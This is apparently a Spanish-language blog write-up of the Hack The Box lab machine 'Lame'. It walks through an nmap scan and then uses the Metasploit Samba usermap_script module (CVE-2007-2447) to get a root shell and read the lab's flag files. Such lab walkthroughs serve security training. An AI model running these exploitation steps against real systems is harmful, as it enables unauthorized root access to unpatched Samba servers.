---
layout: post
title: "Lame" 
date: 2025-11-30 18:30:00 -0300
categories: [WRITEUPS,Lame]
tags: [HTB, Lame]
---
Writeup lame

💀 Lame: Informe Completo del LaboratorioMáquina: LamePlataforma: Hack The Box (HTB)Dificultad: FácilIP Objetivo: 10.129.16.241. 🔍 Reconocimiento y Escaneo (Nmap)El primer paso es realizar un escaneo completo de puertos para identificar los servicios en ejecución y sus versiones.Comando:Bashnmap -sC -sV -p- 10.129.16.24
<figure><img src="/assets/img/writeups/lame/nmap-scan.png" alt="Escaneo Nmap de la máquina Lame, mostrando los puertos clave 21, 22, 139 y 445 abiertos." style="max-width: 100%;"><figcaption align="center">Figura 1: Resultado del escaneo Nmap (10.129.16.24)</figcaption></figure>Resultado Clave del Escaneo:PuertoEstadoServicioVersiónNotas de Vulnerabilidad21/tcpabiertoftpvsftpd 2.3.4Vulnerable a backdoor (CVE-2011-2523)22/tcpabiertosshOpenSSH 4.7p1Versión antigua.139/tcpabiertonetbios-ssnSamba smbd 3.0.20Muy vulnerable.445/tcpabiertonetbios-ssnSamba smbd 3.0.20Muy vulnerable a usermap_script.3632/tcpabiertodistccdRCE conocida.Análisis Inicial: Se detectan versiones extremadamente obsoletas de FTP (vsftpd 2.3.4) y Samba (3.0.20), y un servicio distccd abierto. La vulnerabilidad de Samba usermap_script (CVE-2007-2447) es la ruta más directa y fiable para la explotación.2. 💥 Explotación Inicial (Samba usermap_script)Utilizaremos Metasploit Framework para explotar la vulnerabilidad de Samba usermap_script, que nos permite la ejecución remota de comandos como usuario root debido a cómo maneja las peticiones de nombre de usuario.2.1. Configuración de MetasploitIniciar la consola:Bashmsfconsole
Cargar el Módulo:Bashuse exploit/multi/samba/usermap_script
Configurar las Opciones:Bashset RHOSTS 10.129.16.24
set LHOST [Tu IP de Kali] # Reemplazar con la IP del atacante (ej. 10.10.14.5)
exploit
<figure><img src="/assets/img/writeups/lame/msf-exploit.png" alt="Metasploit ejecutando el exploit usermap_script, resultando en una sesión de Meterpreter abierta y mostrando la IP del atacante." style="max-width: 100%;"><figcaption align="center">Figura 2: Explotación exitosa de Samba y obtención de Meterpreter</figcaption></figure>2.2. Obtención de Shell y Verificación de UsuarioTras el éxito del exploit, se obtiene una sesión de Meterpreter, y dado que esta vulnerabilidad se ejecuta como un proceso con altos privilegios, ya tendremos acceso como root.Migrar a una shell estándar:Bashshell
Verificar privilegios:Bashwhoami
Resultado: root3. 🚩 Captura de las BanderasDado que el acceso inicial nos concedió la shell de root, la escalada de privilegios se omite. Procedemos a la captura de las banderas.3.1. Obtener la Bandera de Usuario (user.txt)El archivo de usuario se encuentra en el directorio /home/makis/.Leer la bandera de usuario:Bashcat /home/makis/user.txt
<figure><img src="/assets/img/writeups/lame/user-flag.png" alt="Comando cat /home/makis/user.txt mostrando la bandera de usuario en la terminal." style="max-width: 100%;"><figcaption align="center">Figura 3: Bandera de Usuario capturada</figcaption></figure>3.2. Obtener la Bandera de Root (root.txt)El archivo de root se encuentra en el directorio /root/.Leer la bandera de root:Bashcat /root/root.txt
<figure><img src="/assets/img/writeups/lame/root-flag.png" alt="Comando cat /root/root.txt mostrando la bandera de root en la terminal, confirmando el control total." style="max-width: 100%;"><figcaption align="center">Figura 4: Bandera Root capturada</figcaption></figure>✅ ConclusiónLame es una máquina de nivel fácil que ejemplifica la peligrosidad de ejecutar servicios con versiones extremadamente obsoletas sin parches. La vulnerabilidad de Samba usermap_script permitió una explotación directa que concedió acceso de root en el primer intento, confirmando que la seguridad más débil de un sistema es a menudo su eslabón más antiguo.
